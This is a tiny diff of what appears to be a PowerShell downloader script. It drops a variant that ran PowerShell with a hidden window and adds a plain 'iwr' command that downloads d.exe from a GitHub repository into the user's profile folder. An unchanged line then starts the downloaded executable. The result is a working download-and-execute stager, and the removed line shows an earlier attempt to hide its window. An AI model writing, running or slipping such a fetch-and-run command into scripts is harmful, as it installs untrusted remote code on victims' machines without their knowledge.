@@ -1,5 +1,4 @@
-
-powershell -WindowStyle Hidden iwr https://github.com/skekic16/lol/raw/main/d.exe?dl=1 -O $Env:USERPROFILE\d.exe
+iwr https://github.com/skekic16/lol/raw/main/d.exe?dl=1 -O $Env:USERPROFILE\d.exe
 
 start-process "$env:USERPROFILE\d.exe"
 
